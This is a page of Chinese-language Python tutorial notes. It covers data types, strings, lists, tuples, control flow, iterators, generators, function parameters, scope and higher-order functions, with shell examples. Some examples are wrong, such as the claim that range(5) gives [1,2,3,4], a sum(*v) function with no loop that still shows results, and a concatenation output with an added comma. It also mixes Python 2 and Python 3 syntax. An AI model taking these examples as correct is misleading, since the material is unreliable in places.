将数字类型转换为布尔值，即进行真假判断。除了’’、“”、o、()、[]、{}、None、0.0、0L&#x2F;0.0+0.0j、False为False，其他都为True 进制转换函数hex（） 传一个整数进去，得到一个十六进制 oct（） 传一个整数进去，得到一个八进制 bin（） 传一个整数进去，得到一个二进制 ASCII转换函数范围为0到255 ord（） 接受一个字符，返回一个整数值 chr（） 接受一个整数值，返回一个字符 内置模块math高级数学模块，模块中包含大量已经编写好的数值代码 &gt;&gt;&gt;import math 调用math模块 &gt;&gt;&gt;math.sqrt（4） 2.0 计算4的平方根 random随机数学模块，模块中包含多个伪随机数发生器，已当前时间戳为随机数种子 import random randrange（） 随机返回（最小值，最大值）中的一个整数 uniform（） 返回二者之间的浮点数 choice（） 给定一个数列，从数列中调选一个参数 变量id（） 查询当前内存的变量 var &#x3D; value var变量 var&#x3D;赋值运算符 value对象 变量长度不受限制，但是只能为字母，数字，下划线 第一个字符不能是数字，不能是123，但可以是a123 区分大小写 一些关键词不能作为变量 多值赋值：a，b，c &#x3D; 1，2，3 交叉赋值： a = 123 b = a a = &#39;xyz&#39; print b 123 序列列表列表的定义列表是一组有序的集合对象类型，可以包括数字、字符串甚至列表等信息 列表理论上可以存储无限的元素且支持复杂的数据存储和处理 语法：变量&#x3D;【元素1，元素2，元素3……】 L&#x3D;【‘hello’，123，【10，20】】 操作符索引操作符&gt;&gt;&gt; l = [&#39;hello&#39;, 123, [10,20]] &gt;&gt;&gt; l[0] &#39;hello&#39; &gt;&gt;&gt; l[1] 123 &gt;&gt;&gt; l[2][0] 10 &gt;&gt;&gt; l[2][1] 20 替换：L[1] = &#39;hi&#39; 切片操作符&gt;&gt;&gt; l = [&#39;hello&#39;, 123, [10,20]] &gt;&gt;&gt; l[0:1] [&#39;hello&#39;] &gt;&gt;&gt; l[0:2] [&#39;hello&#39;, 123] &gt;&gt;&gt; l[0:3] [&#39;hello&#39;, 123, [10, 20]] 连接操作符&gt;&gt;&gt; l1 = [&#39;hello&#39;,123] &gt;&gt;&gt; l2 = [456,789] &gt;&gt;&gt; l1 + l2 [&#39;hello&#39;, 123, 456, 789] 重复操作符&gt;&gt;&gt; l1 * 3 [&#39;hello&#39;, 123, &#39;hello&#39;, 123, &#39;hello&#39;, 123] 成员操作符&gt;&gt;&gt; &#39;hello&#39; in l True &gt;&gt;&gt; &#39;hi&#39; in l False &gt;&gt;&gt; 123 not in l False 内置函数内置函数（字符串也通用的函数） len（） 获取列表的元素个数 max（） 获取列表中的最大值 min（） 获取列表中的最小值 sum（） 将列表元素相加 cmp（） 对比两个列表的大小；返回的值中，-1表示小于，1表示大于，0表示相等 列表增加L.append（） 添加元素到列表末端 L.insert（） 添加元素到具体索引位置 l.insert(1,20) 在1位置添加一个20 L.extend（） 在列表的末尾添加其他列表的元素 列表删除L.pop（） 默认删除列表末尾的元素，可以指定索引删除 L.remove（） 删除某个指定的元素（第一个匹配项） 列表搜索L.count（） 统计某个元素出现的次数 L.index（） 找出列表某个元素第一个出现的索引位置 列表排序L.reverse（） 翻转列表元素位置 L.sort（） 对列表大小进行排序 进阶操作列表解析 又称列表生成式：即通过特定的表达式简洁方便的生成新的列表语法：【X for Y in Z】 X为需要得到的结果；Y是用于遍历Z的参数；Z是被遍历的对象；X与Y是相关联的进阶语法：【X for Y in Z if J】 ifJ为判断条件 &gt;&gt;&gt; [x + 1 for x in (1,2,3)] X即x + 1；Y即x；Z即（1，2，3） [2, 3, 4] &gt;&gt;&gt; [x for x in &#39;hello&#39;] X即x；Y即x；Z即‘hello&#39; [&#39;h&#39;, &#39;e&#39;, &#39;l&#39;, &#39;l&#39;, &#39;o&#39;] &gt;&gt;&gt; [x * x for x in range(1,5)] [1, 4, 9, 16] &gt;&gt;&gt; [x + 1 for x in [1,2,3,4,5] if x &gt; 3] [5, 6] &gt;&gt;&gt; l1 = [&#39;hello&#39;,&#39;world&#39;] &gt;&gt;&gt; l2 = [x.upper() for x in l1] &gt;&gt;&gt; l2 [&#39;HELLO&#39;, &#39;WORLD&#39;] 元组元组的定义元组是一组有序的不可变的集合对象类型，可以包括数字、字符串甚至列表&#x2F;元组等信息 对比列表，元组是用小括号来创建，其他特征基本相同 元组不可修改，如果对对象的操作要求是只读的，使用元组更加安全 可以通过list（）或者tuple（）函数实现列表和元组的转换 当元组的元素只有一个时，即单元组，必须在最后加一个逗号，否则会变为字符串 操作符基本与列表相同 索引操作符&gt;&gt;&gt; t = (&#39;hello&#39;,123,[10,20]) &gt;&gt;&gt; t[0] &#39;hello&#39; 切片操作符&gt;&gt;&gt; t = (&#39;hello&#39;,123,[10,20]) &gt;&gt;&gt; t[0:1] (&#39;hello&#39;,) 连接操作符&gt;&gt;&gt; t = (&#39;hello&#39;,123) &gt;&gt;&gt; t1 = (&#39;hello&#39;,123) &gt;&gt;&gt; t2 = (456,789) &gt;&gt;&gt; t = t1 + t2 &gt;&gt;&gt; t (&#39;hello&#39;, 123, 456, 789) 重复操作符&gt;&gt;&gt; t = (&#39;hello&#39;, 123) &gt;&gt;&gt; t * 2 (&#39;hello&#39;, 123, &#39;hello&#39;, 123) 成员操作符&gt;&gt;&gt; t = (&#39;hello&#39;, 123) &gt;&gt;&gt; &#39;hello&#39; in t True &gt;&gt;&gt; 123 not in t False 内置函数T.coun（） 统计某个元素在列表出现的次数 T.index（） 找出列表某个元素第一出现的索引位置 字符串字符串的定义单引号双引号以及三引号字符串可以用单引号、双引号、三引号来表示 单引号和双引号使得字符串本身具备引号 三引号主要用于多行字符串&#x2F;文本说明 有序性和不可逆性有序性是指字符串的顺序是从左到右 0→1→2→3→4→… 不可逆性是指数字、字符串、元祖是不可变的，列表、字典是可变的 操作符索引操作符操作语法：字符串[索引值x] 索引为x的字符 &gt;&gt;&gt;s = &#39;hello&#39; &gt;&gt;&gt;s[1] &#39;e&#39; &gt;&gt;&gt;s[-1] &#39;o&#39; 切片操作符操作语法：字符串[索引值x:索引值y] 访问索引从x到y的字符，包括x单不包括y 反向切片道理相同 默认切片：可以只打x或者y 比如：s[1:] or s[:-3] 连接操作符两个字符串叠加在一起，得到一个新的字符串，用+连接 &gt;&gt;&gt;s1 = &#39;hello&#39; &gt;&gt;&gt;s2 = &#39;world&#39; &gt;&gt;&gt;s3 = s1 + s2 &gt;&gt;&gt;s3 &#39;hello，world&#39; 重复操作符用于copy字符串，用*连接 &gt;&gt;&gt;s1 = &#39;hello&#39; &gt;&gt;&gt;s1*10 &quot;hellohellohellohellohellohellohellohellohellohello&quot; 成员操作符通过in or not in 判断字符串里是否夹带某些字符 &gt;&gt;&gt;s1 = &#39;hello&#39; &gt;&gt;&gt;&#39;h&#39; in s1 True &gt;&gt;&gt;&#39;he&#39; not in s1 False 内置函数判断函数s.isalnum（） 判断字符串s是否只包含数字或者字母，是返回True，否返回False s.isalpha（） 判断字符串s是否只包含字母，是返回True，否返回False s.isdigit（） 判断字符串s是否只包含数字，是返回True，否返回False s.islower（） 判断字符串s是否只包含小写字母，是返回True，否返回False s.isupper（） 判断字符串s是否只包含大写字母，是返回True，否返回False s.isspace（） 判断字符串s是否只包含空白字符，是返回True，否返回False s.startswith（t） 判断字符串s是否以t开头，是返回True，否返回False s.endswith（t） 判断字符串s是否以t结尾，是返回True，否返回False s.isidentifier（） 判断字符串s是否合法的标识符，如果是返回True，否则返回False s.isdecimal（） 判断字符串s是否只包含十进制数字的字符，如果是返回True，否则返回False s.isnumeric（） 判断字符串s是否只包含数字，如果是返回True，否则返回False s.isprintable（） 判断字符串s是否只包含可打印字符，如果是返回True，否则返回False s.istitle（） 判断字符串s大小写符合头衔要求（title-case），如果是返回True，否则返回False 搜索函数s.count（t） 搜索字符t，返回字符串中出现t的次数 s.find（t） 搜索字符t，如果没有找到，则返回-1；否则返回t在s中的起始位置 s.index（t） 与find相同，如果没有找到t的话，则引发ValueError异常 s.rfind（t） 与find相同，但从右到左搜索。返回t在s中的最后一次出现时的起始位置索引 s.rindex（t） 与index相同，但从右到左搜索。返回t在s中的最后一次出现时的起始位置索引 格式函数s.center（n,t） 包含n个字符的字符串，其中s位于中央，两边用t填充，t可选 s.ljust（n,t） 包含n个字符的字符串，其中s位于左边，右边用t填充，t可选 s. rjust（n,t） 包含n个字符的字符串，其中s位于右边，左边用t填充，t可选 s.format（vars） 格式化字符串，类似%。用于字符映射以及格式限定 剥离函数s.strip（t） 从s开头和末尾删除所有包含在字符串中的t字符，默认删除空格 s.lstrip（t） 从s开头（左端）和末尾删除所有包含在字符串中的t字符，默认删除空格 s.rstrip（t） 从s开头（右端）和末尾删除所有包含在字符串中的t字符，默认删除空格 拆分函数s.partition（t） 将s拆分成三个字符串（head、t、tail），其中head为t前面的子串，tail为t后面的子串 s.rpartition（t） 与partition相同，单从s的右端开始搜索t s.split（t） 以t为分隔符，将s划分为一系列子串，并返回一个由这些子串组成的列表 s.rsplit（t） 与split相同，但从s的右边开始搜索t s.splitilines（） 返回一个由s中的各行组成的列表，一般用于多行的切割 替换函数s.replace（old，new） 将s中的每个old替换为new s.expandtabs（n） 将s中的每个字符表tab替换为n个空格 大小写函数s.lower（） 让s中的所有字母都小写 s.upper（） 让s中的所有字母都大写 s.capitalize（） 将s的第一个字符改为大写 s.swapcase（） 将小写字母改为大写，并将大写改为小写 s.title（） 让s的大小写符合标题化要求，即第一个字符大写，其他字符小写 进阶操作字符编码编码原理：因为电脑只认识0和1，处理字符时，需要将字符转换为数字存储并处理，将字符与数字相互对应的编码规范称为字符编码（码表） 编码分类：ASCII：最早的字符编码规则称为ASCII；采用1个字节8个比特来表示字符；最多支持255个字符；只能支持英语Unicode：又称万国码，采用2个字节或者4个字节来表示字符，一般采用两个；支持所有国家 UTF-8：Unicode有些字符并不需要两个字节来进行存储和传输，所以UTF-8为可变长编码；采用1到6个字节来存储和传输；支持所有国家 编码设置：#！/usr/bin/python：为Linux&#x2F;Unix环境设置环境变量&#x2F;执行路径 #-*-coxling：UTF-8-*-：采用UTF-8打开，支持中文，使python支持中文字符 转义字符转义概述：通过引入转义字符，可以实现字符串中的特殊需求，比如换行、回车等功能；在需要使用特殊字符时，用反斜杠转义字符 \\ 续行符 \\ 反斜杠符号，结果保留一个斜杠 &#39; 单引号 &quot; 双引号 \\n 换行 \\t 横向制表符 \\v 纵向制表符 \\r 回车 \\b 退格 \\a 响铃 \\e 转义 \\000 空 \\f 换页 \\ott 八进制数，tt代表的字符 \\xtt 十六进制数，tt代表的字符 关闭转义：在字符串之前加入r’，就可以关闭r之后的转义字符 格式化字符通过引入格式化字符，可以实现更加复杂的字符串表达，通常用%表示 在%的左侧放置一个需要格式化的字符串，这个字符串带有一个或多个转换目标，都以%开头 在%的右侧放置一个或多个对象，这些对象会插入左侧的字符串中去 %s 格式化字符串%d 格式化整数%c 格式化字符及其ASCII码%u 格式化无符号整形%o 格式化无符号八进制%x 格式化无符号十六进制%X 格式化无符号十六进制（大写）%f 格式化浮点数字，可指定小数点后的精度%e 用科学计数法格式化浮点数%E 作用同e%g %f和%e的简写%G %F和%E的简写%p 用十六进制格式化变量的地址 &gt;&gt;&gt; &#39;hello, %s&#39; % &#39;J&#39; &#39;hello, J&#39; &gt;&gt;&gt; &#39;Hello, %s, Welcome to %s&#39; % (&#39;J&#39;, &#39;PINGINGLAB&#39;) &#39;Hello, J, Welcome to PINGINGLAB&#39; &gt;&gt;&gt; &#39;%s is %d years old&#39; % (&#39;J&#39;, 18) &#39;J is 18 years old&#39; &gt;&gt;&gt; x = &#39;J&#39; &gt;&gt;&gt; y = 18 &gt;&gt;&gt; &#39;%s is %d years old&#39; % ( x , y) &#39;J is 18 years old&#39; 流程控制条件语句-if定义if语句用于实现条件判断，让程序作出简单或者复制的决策若为真则执行，反之不执行 if……else: if……eief……else: 语法单if条件if条件判断1： if条件判断根据代码返回的布尔值T或者F来进行选择操作 代码块1 布尔/比较/身份/成员操作能够返回T或者R else： 代码块2 else是可选部分，若没有else，if为假时什么都不执行 多if条件if条件判断1： 代码块1 elif条件判断2： elif相当于else if 代码块2 多条件判断时，只要有一个为真，则执行后结束判断 elif条件判断3： 代码块3 …… else： 代码块n 举例单条件判断判断正负数 &gt;&gt;&gt; num = 10 &gt;&gt;&gt; if num &gt; 0 : ... print &#39;正数&#39; ... else: ... print &#39;负数&#39; ... 正数 用户输入一个数字，判断正负数 num = input(&#39;number: &#39;) 通过input( )函数获取用户输入 n = int(num) 通过int( )整数函数将用户输入转换为整数 if n &gt; 0 : print &#39;正数&#39; else: print &#39;负数&#39; 多条件判断判断成绩优良中差 &gt;&gt;&gt; score = 80 &gt;&gt;&gt; if score &lt; 60: ... print &#39;不及格&#39; ... elif 60&lt;= score &lt;= 79: ... print &#39;中等&#39; ... elif 80 &lt;= score &lt;= 100: ... print &#39;优良&#39; ... else: ... pass ... 优良 用于输入分数，给出判断结果 score = int(input(&#39;分数: &#39;)) if score &lt; 60: ... print &#39;不及格&#39; ... elif 60&lt;= score &lt;= 79: ... print &#39;中等&#39; ... elif 80 &lt;= score &lt;= 100: ... print &#39;优良&#39; ... else: ... pass 多条件同时判断or表示任意一个条件成立即可 &gt;&gt;&gt; num = 8 &gt;&gt;&gt; if num &gt; 9 or num &lt; 10: ... print &#39;yes&#39; ... else: ... print &#39;no&#39; ... yes and表示所有条件成才可以 &gt;&gt; num = 8 &gt;&gt;&gt; if num &gt; 9 and num &lt; 10: ... print &#39;yes&#39; ... else: ... print &#39;no&#39; ... no 嵌套条件判断if...else...语句嵌套if...else...语句 &gt;&gt;&gt; num = 8 &gt;&gt;&gt; if num &lt; 10: ... print &#39;yes&#39; ... if num == 8: ... print &#39;it is 8&#39; ... else: ... print &#39;it is others&#39; ... else: ... print &#39;no&#39; ... yes it is 8 条件表达式条件表达式也称为三元操作符，是if语句的缩写格式 如果X为真，则A等于Y，否则A等于Z if X: A=Y else: A=Z A=Y if X else Z &gt;&gt;&gt; num = 8 &gt;&gt;&gt; A = 10 if num &gt; 0 else 9 &gt;&gt;&gt; A 10 循环语句定义for语句用于实现循环，例如对列表和字符等可迭代对象进行遍历 语法for x in y: 代码块 x为变量 y为可迭代对象，可以是字符串&#x2F;元祖&#x2F;列表&#x2F;字典&#x2F;函数等可迭代对象 举例遍历字符串&gt;&gt;&gt; s = &#39;hello,world&#39; &gt;&gt;&gt; for x in s: ... print x ... 会得到s中的所以字符 遍历列表&gt;&gt;&gt; l = [1,2,3] &gt;&gt;&gt; for x in l: ... print x ... 会得到l中的所有数字 计算和&gt;&gt;&gt; l = [1,2,3,4,5] &gt;&gt;&gt; sum = 0 &gt;&gt;&gt; for i in l: ... sum = sum + i ... print sum ... 会得到叠加的结果 计算乘阶&gt;&gt;&gt; i = 1 &gt;&gt;&gt; for x in [1,2,3,4,5]: ... i = i * x ... print i ... 会得到叠乘的结果 for语句结合else当循环执行完之后则执行else语句 &gt;&gt;&gt; l1 = [1,2,3,4,5] &gt;&gt;&gt; for i in l1: ... l = i * i ... print l ... else: ... print i ... 会得到列表中的每个数的平方，以及结束循环后的5 for语句结合range( )range( )函数可以生成整数列表 range(x,y）会生成x到y-1的整数列表 range(start, end, step) range(start, end, step) &gt;&gt;&gt; for x in range(5): ... i = i * (x + 1) ... print i ... range(5)等于【1，2，3，4】 for语句结合zip( )zip( )函数获取多个列表的元素，生成内置元祖的列表 结合for循环语句可以实现多列表并行遍历 for (x,y) in zip (l1, l2) &gt;&gt;&gt; l1 = [&#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;] &gt;&gt;&gt; l2 = [1,2,3,4] &gt;&gt;&gt; zip(l1,l2) [(&#39;a&#39;, 1), (&#39;b&#39;, 2), (&#39;c&#39;, 3), (&#39;d&#39;, 4)] &gt;&gt;&gt; for (x,y) in zip(l1,l2): ... print x , y ... for语句结合map( )map( )函数将可迭代对象的每个元素传入函数并返回一个列表 map函数包括函数和可迭代对象（列表等） 当函数为None时，map( )可以实现并行解析 map(f, iterable) &gt;&gt;&gt; l1 = [&#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;] &gt;&gt;&gt; l2 = [1,2,3,4] &gt;&gt;&gt; map(None,l1,l2) [(&#39;a&#39;, 1), (&#39;b&#39;, 2), (&#39;c&#39;, 3), (&#39;d&#39;, 4)] &gt;&gt;&gt; for (x,y) in map(None,l1,l2): ... print x , y ... for语句结合enumerate( )enumerate( )用于给传入的可迭代对象索引，返回迭代器 &gt;&gt;&gt; for (x,y) in enumerate(迭代对象): &gt;&gt;&gt; l1 = [&#39;a&#39;,&#39;b&#39;,&#39;c&#39;] &gt;&gt;&gt; for (x,y) in enumerate(l1): ... print x,y ... 条件循环语句定义while语句用于实现条件循环，可以在条件满足的情况下循环执行代码块 若结果为真则执行循环，反之不执行（若…则循环…） 语法while条件判断： 循环代码块 While条件判断根据代码返回的布尔值T或F来进行选择操作 般在条件判断之前，会有初始语句，例如定义变量初始值等 举例输出1到10&gt;&gt;&gt; n = 0 &gt;&gt;&gt; while n &lt; 10: ... n = n + 1 ... print n 输出0到10数字相加的结果&gt;&gt;&gt; n = 0 &gt;&gt;&gt; sum = 0 &gt;&gt;&gt; while n &lt; 10: ... sum = sum + n ... n = n + 1 ... print sum while与else结合 &gt;&gt;&gt; n = 0 &gt;&gt;&gt; while n &lt; 10: ... n = n + 1 ... print n ... else: ... n = -n ... print n ... 循环控制break定义用于while和for循环中，用于终止整个循环语句 举例while语句中使用break，结合if判断，当搜索到某个字符串时，终止遍历 &gt;&gt;&gt; n = 0 &gt;&gt;&gt; while n &lt; 10: ... n = n + 1 ... if n == 5: ... break ... print n ... 1 2 3 4 for语句中使用break，结合if判断，当搜索到某个字符串时，终止遍历 &gt;&gt;&gt; for i in &#39;Hello,world!&#39;: ... if i == &#39;,&#39;: ... break ... print &#39;The letter is: &#39;,i ... The letter is: H The letter is: e The letter is: l The letter is: l The letter is: o continue定义用于while和for循环中，用于终止本次循环 举例&gt;&gt;&gt; for i in &#39;Hello,world!&#39;: ... if i == &#39;,&#39;: 检查到字符串“,”时，直接忽略并继续下面的循环 ... continue ... print &#39;The letter is: &#39;,i ... 结果会忽略‘，’,除这个以外的都会显示 pass定义用于循环语句、条件语句、函数语句中占空，保证语句完整 举例&gt;&gt;&gt; for i in &#39;Hello,world!&#39;: ... pass ... &gt;&gt;&gt; while n &lt; 10: ... pass 用ctrl + c快捷键终止此循环执行 &gt;&gt;&gt; def f(): ... pass ... 进阶语句迭代器定义和语法迭代: 迭代（Iteration）指的是对可迭代对象进行从头到尾访问&#x2F;遍历的过程。例如for循环的底层原理就是一个迭代 迭代器: 迭代器（Itarator）指的是通过iter( )函数所返回的一个支持next( )方法的对象 迭代方法: iter( ) 通过iter( )可以获得可迭代对象；默认可迭代对象没有next( )函数，通过iter( )迭代函数赋予next( ) next( ) 返回可迭代对象中的下一个元素，并检查StopIteration异常终止迭代 迭代的原理: 可迭代对象（iterable）在进行遍历&#x2F;迭代的时候，自动调用iter获取迭代器，自动调用next方法获取下一个元素例如 for i in [1,2,3] Python自动调用iter( )函数获取迭代器，自动调用next( )函数获得下一个元素 iter( L )&amp;next( L ) 举例手工迭代列表&gt;&gt;&gt; l = [1,2,3] &gt;&gt;&gt; I = iter(l) &gt;&gt;&gt; I &lt;listiterator object at 0x10d2b8b50&gt; i为列表迭代器 &gt;&gt;&gt; I.next() 1 &gt;&gt;&gt; I.next() 2 &gt;&gt;&gt; I.next() 3 &gt;&gt;&gt; I.next() Traceback (most recent call last): 成为迭代器之后才能使用next函数 File &quot;&lt;input&gt;&quot;, line 1, in &lt;module&gt; StopIteration 手工迭代字典&gt;&gt;&gt; D = &#123;&#39;a&#39;:1, &#39;b&#39;:2, &#39;c&#39;:3&#125; &gt;&gt;&gt; I = iter(D) &gt;&gt;&gt; I &lt;dictionary-keyiterator object at 0x10d2bbaf8&gt; &gt;&gt;&gt; next(I) &#39;a&#39; &gt;&gt;&gt; next(I) &#39;c&#39; &gt;&gt;&gt; next(I) &#39;b&#39; &gt;&gt;&gt; next(I) Traceback (most recent call last): File &quot;&lt;input&gt;&quot;, line 1, in &lt;module&gt; StopIteration 通过try...except...语句自动迭代列表 &gt;&gt;&gt; l = [1,2,3,4,5] &gt;&gt;&gt; i = iter(l) &gt;&gt;&gt; i &lt;listiterator object at 0x10d2b8bd0&gt; &gt;&gt;&gt; try: ... while True: ... n = i.next() ... print n ... except StopIteration: ... pass ... 注：等价于for i in l 列表解析定义和语法列表解析（List comprehensions）主要用于动态的创建列表 列表解析是迭代技术的一个应用，采用for循环和迭代函数动态生成列表，更简洁方便 [X for Y in Z] [expr for iter_var in iterable] for循环通过变量iter_var遍历可迭代对象iterable expr应用于序列的每个成员，最终结果即产生的列表 [X for Y in Z if J] if J 为判断条件 举例&gt;&gt;&gt; [x + 1 for x in (1,2,3)] [2, 3, 4] &gt;&gt;&gt; [x for x in &#39;hello&#39;] [&#39;h&#39;, &#39;e&#39;, &#39;l&#39;, &#39;l&#39;, &#39;o&#39;] &gt;&gt;&gt; [x * x for x in range(1,5)] [1, 4, 9, 16] &gt;&gt;&gt; [x + 1 for x in [1,2,3,4,5] if x &gt; 3] [5, 6] &gt;&gt;&gt; l1 = [&#39;hello&#39;,&#39;world&#39;] &gt;&gt;&gt; l2 = [x.upper() for x in l1] &gt;&gt;&gt; l2 [&#39;HELLO&#39;, &#39;WORLD&#39;] 生成器表达式定义和语法生成器是特定的函数, 允许返回一个值, 然后”暂停”代码的执行, 稍后恢复 生成器表达式是生成器的应用，是列表解析和生成器的结合，也是列表解析的拓展 生成器表达式按需返回产生结果的一个对象，而不是返回或构建一整个结果列表 列表解析是直接生产最终的列表，而生成器表达式按需生产内容，相比而言，后者更加节省内存空间 语法： (expr for iter_var in iterable if cond_expr) 列表解析用[ ] 生成器表达式用（ ） 举例&gt;&gt;&gt; l1 = [x + 1 for x in (1,2,3)] &gt;&gt;&gt; l1 [2, 3, 4] &gt;&gt;&gt; l2 = (x + 1 for x in (1,2,3)) &gt;&gt;&gt; l2 &lt;generator object &lt;genexpr&gt; at 0x10d2bf8c0&gt; &gt;&gt;&gt; l2.next() 2 &gt;&gt;&gt; l2.next() 3 &gt;&gt;&gt; l2.next() 4 &gt;&gt;&gt; l2.next() Traceback (most recent call last): File &quot;&lt;input&gt;&quot;, line 1, in &lt;module&gt; StopIteration 函数模块函数定义和功能函数（Function）是一组可重复使用、有特定功能的代码块 可重复使用 减少程序代码量 提高代码可读性 原理调用函数通过为函数传入参数，即可得到相关的返回结果 函数使用过程中，我们无需知道函数内部实现原理 不同函数需要的参数个数和类型不同，有些需要多个参数，有些需要字符串&#x2F;数字&#x2F;列表参数 创建函数语法 函数头由def + 函数名+ （参数）三个部分组成 函数名与变量名称规则一致，可以包括字母、数字、下划线等 括号内可以有参数或者没有参数 return 表达式：return表达式为函数的可选部分；若不包括return表达式，则该函数为“不返回值函数”；若包括return表达式，则该函数为”返回值函数” 举例&gt;&gt;&gt; def hello(): ... print &#39;hello,world!&#39; ... &gt;&gt;&gt; hello() hello,world! &gt;&gt;&gt; def hello(name): ... print &#39;hello&#39;,name ... return name * 2 ... &gt;&gt;&gt; hello(&#39;Jay&#39;) hello Jay &#39;JayJay&#39; 函数的参数位置参数函数根据位置顺序将参数值传入参数 &gt;&gt;&gt; def sum(a,b): ... return a + b ... &gt;&gt;&gt; sum(1,2) 3 默认参数函数将部分参数指向默认值，后续可以不用为此参数传入值 通过默认参数，可以减低调用函数的难度 函数包含默认参数时，必选参数在前，默认参数在后 &gt;&gt;&gt; def sum(a , b=2): 第二个参数b设置默认值为2 ... return a + b ... &gt;&gt;&gt; x = 1 &gt;&gt;&gt; sum(x) 调用sum函数，a指向x的值，b采用默认值 3 &gt;&gt;&gt; y = 10 &gt;&gt;&gt; sum(x,y) 默认参数可以被覆盖 11 关键字参数使用关键字参数允许函数调用时参数的顺序与声明时不一致，Python解释器根据参数名匹配参数值 &gt;&gt;&gt; def m(a, b): ... return a * b ... &gt;&gt;&gt; m (b = 5, a=10) 50 可变长参数非关键字可变参数（*元祖）def func(*tuple)函数通过*获取可变数量的参数，并全部放入元祖 关键字可变参数（**字典）def func(**dict)函数通过**获取可变数量的参数，并全部放入字典 &gt;&gt;&gt; def f(*args): 此处的打星号的参数，即代表可变长度元祖 ... print args ... &gt;&gt;&gt; f(1) (1,) &gt;&gt;&gt; f(1,2) (1, 2) &gt;&gt;&gt; def sum(*v): 此处的打星号的参数，即代表可变长度元祖 ... s = 0 ... s = s + i ... return s ... &gt;&gt;&gt; sum(1,2) 3 &gt;&gt;&gt; sum(1,2,3,4,5) 15 &gt;&gt;&gt; def func(**dict): ... print dict ... &gt;&gt;&gt; func(x = 1, y = 2, z = 3) &#123;&#39;y&#39;: 2, &#39;x&#39;: 1, &#39;z&#39;: 3&#125; &gt;&gt;&gt; func(x = 1, y = 2, z = 3, j = 4) &#123;&#39;y&#39;: 2, &#39;x&#39;: 1, &#39;z&#39;: 3, &#39;j&#39;: 4&#125; 混合参数函数头定义参数列表时，可以同时包含位置参数、默认参数、关键字参数、可变参数 通过混合参数的方式，可以接收和处理更加复杂的内容 混合参数需要按照特定位置放置 位置参数(必备参数）-&gt; 默认参数 -&gt; 可变参数（* -&gt; **） &gt;&gt;&gt; def func(x, y = 1, *tuple, **dict): ... print x ... print y ... print tuple ... print dict ... &gt;&gt;&gt; func(10,20,30,40,z=1,j=50) 10 20 (30, 40) &#123;&#39;z&#39;: 1, &#39;j&#39;: 50&#125; 变量作用域局部变量 在函数内部定义的变量称为局部变量 变量作用域指的是该变量能够被使用的范围 局部变量只能在其所属函数中使用 在函数外面，不能访问函数的局部变量。 &gt;&gt;&gt; def var(x,y): ... s = x - y ... print(s) ... &gt;&gt;&gt; var(5,1) s为函数var的变量，由x和y参数的表达式组成 4 由于s的作用域在函数内部，所以无法在外部调用此变量 &gt;&gt;&gt; s Traceback (most recent call last): File &quot;&lt;input&gt;&quot;, line 1, in &lt;module&gt; NameError: name &#39;s&#39; is not defined &gt;&gt;&gt; print(s) Traceback (most recent call last): File &quot;&lt;input&gt;&quot;, line 1, in &lt;module&gt; NameError: name &#39;s&#39; is not defined &gt;&gt;&gt; def A(): ... a = 1 ... print(a) ... &gt;&gt;&gt; def B(): ... a = 2 ... print(a) ... &gt;&gt;&gt; a = 3 &gt;&gt;&gt; A() 1 &gt;&gt;&gt; B() 2 &gt;&gt;&gt; a 3 全局变量在函数外部定义的变量称为全局变量 全局变量能被整个程序范围调用 &gt;&gt;&gt; name =&#39;JAY&#39; &gt;&gt;&gt; def hello(): ... print(&#39;HI&#39;,name) 调用外部变量 ... &gt;&gt;&gt; hello() HI JAY &gt;&gt;&gt; name = &#39;JAY&#39; 外部变量name &gt;&gt;&gt; def hello(): ... name = &#39;James&#39; 函数内部变量name ... print(&#39;HI&#39;,name) 这里调用变量name，若函数内部有则调用内部，若没 &gt;&gt;&gt; hello() 有，调用外部；若外部也没有，报错 HI James &gt;&gt;&gt; name = &#39;JAY&#39; &gt;&gt;&gt; def hello(): ... global name 调用外部变量 ... name = &#39;J&#39; 进行重新赋值 ... print(&#39;HI&#39;,name) ... &gt;&gt;&gt; hello() HI J &gt;&gt;&gt; name 外部变量被修改 &#39;J&#39; 进阶函数式编程函数式编程是一种高级的编程方法，采用一系列的函数来解决问题 函数式编程是一种面向过程的实现，数据经过函数不断输入输出处理 函数式编程采用高阶函数来实现复杂的处理 高阶函数是一种高级函数，至少包含以下条件之一： 函数作为参数被传入 函数作为结果被输出 Python可以支持高阶函数，通过高阶函数可以实现函数式编程。 支持递归、闭包、装饰器等高级特性 Python实现部分的函数式编程，函数输入允许有变量 纯函数式编程输入没有变量，输出是固定的 含变量的输入，输出结果会发生变动，有副作用 内置高阶函数lambda函数匿名函数，当需要一个函数，但是不需要这个函数的名字的时候，则可以通过lambda表达式来实现 通过lambda表达式，减少程序中的函数名字和代码量，实现更简洁的代码 lambda 参数：表达式 lambda x, y: x + y &gt;&gt;&gt; lambda x,y:x + y &lt;function &lt;lambda&gt; at 0x0000000003313620&gt; &gt;&gt;&gt; a = lambda x,y:x + y &gt;&gt;&gt; a(1,2) 3 &gt;&gt;&gt; b = lambda x,y = 2:x + y &gt;&gt;&gt; b(1) 3 &gt;&gt;&gt; b(2) 4 &gt;&gt;&gt; c = lambda *z:z &gt;&gt;&gt; c(1) (1,) &gt;&gt;&gt; c(1,2) (1, 2) &gt;&gt;&gt; c(3) (3,) map函数map函数接收两个参数，第一个是函数，第二个是列表（可迭代对象） 将函数作用在序列的每个元素上， 然后创建由每次函数应用组成的返回值列表 map函数能够用列表解析表达式来实现 map( 函数，列表） &gt;&gt;&gt; list(map((lambda x:x*x),[1,2,3])) [1, 4, 9] reduce函数reduce跟map类似，也是接收函数和列表 区别在于reduce将列表中两个元素放入函数计算并得到值，然后将此值与列表的下一个元素放入函数计算得到另外一个值 reduce这种“折叠”的处理方式，最终可以得到一个值 reduce( 函数，列表） reduce每次从列表中取出2个元素放入函数 reduce(func, [1, 2, 3])→func(func(1, 2), 3) &gt;&gt;&gt; from functools import reduce &gt;&gt;&gt; reduce ((lambda x,y: x + y),[1,2,3,4]) 10 reduce在py3.0.0之后就除名了，想要使用就必须调用from functools import reduce filter函数filter函数是一个过滤函数，根据True或False来决定最终结果，如果是True则保留下来 filter( 函数，列表） &gt;&gt;&gt; def pos(n): ... return n &gt; 0 ... &gt;&gt;&gt; list(filter(pos,[-1,1,0,-2,3])) [1, 3] &gt;&gt;&gt; def odd(n): ... return n % 2 == 1 ... &gt;&gt;&gt; list(filter(odd,range(10))) [1, 3, 5, 7, 9 返回函数函数作为结果被输出 内置函数中如map函数，是将函数作为输入 &gt;&gt;&gt; def sum2(x,y): ... def sum1(): ... return x + y ... return sum1 ... 